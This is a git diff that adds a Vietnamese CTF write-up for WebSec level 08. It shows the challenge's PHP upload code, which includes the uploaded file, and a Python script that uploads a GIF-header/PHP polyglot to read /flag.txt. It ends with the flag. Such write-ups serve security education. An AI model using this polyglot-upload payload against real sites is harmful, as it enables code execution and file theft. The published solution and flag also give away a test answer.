@@ -455,3 +455,65 @@ Cuối cùng thực hiện trên thử thách, chúng ta cần thêm điều ki�
 ### Flag
 
 `WEBSEC{Because_blacklist_based_filter_are_always_great}`
+
+## Level 08
+
+> Bypassing Security Checks
+>
+> 🔥 <https://websec.fr/level08/index.php>
+
+![image](images/level-08/image-1.png)
+
+```php
+<?php
+$uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');
+
+if (file_exists($uploadedFile)) {
+    unlink($uploadedFile);
+}
+
+if ($_FILES['fileToUpload']['size'] <= 50000) {
+    if (getimagesize($_FILES['fileToUpload']['tmp_name']) !== false) {
+        if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
+            move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
+            echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">' . htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
+            echo '<pre>';
+            include_once($uploadedFile);
+            echo '</pre>';
+            unlink($uploadedFile);
+        } else {
+            echo '<p class="text-danger">The file is not a GIF</p>';
+        }
+    } else {
+        echo '<p class="text-danger">The file is not an image</p>';
+    }
+} else {
+    echo '<p class="text-danger">The file is too big</p>';
+}
+
+```
+
+Server cho phép chúng ta tải lên file và yêu cầu phải là file GIF bằng cách dùng `exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF`.
+
+Chúng ta có thể bypass bằng cách tải lên một file có chứa GIF magic byte và code PHP để khai thác lỗi LFI do server dùng `include_once($uploadedFile);`.
+
+Vậy, chúng ta sẽ viết script Python sau để hoàn thành thử thách:
+
+```python
+import requests
+import re
+
+URL = "https://websec.fr/level08/index.php"
+
+file = {
+    "fileToUpload": "GIF89a\n<?php echo file_get_contents('/flag.txt'); ?>"
+}
+
+r = requests.post(URL, files=file)
+print(re.search(r"WEBSEC{\w+}", r.text).group(0))
+
+```
+
+### Flag
+
+`WEBSEC{BypassingImageChecksToRCE}`
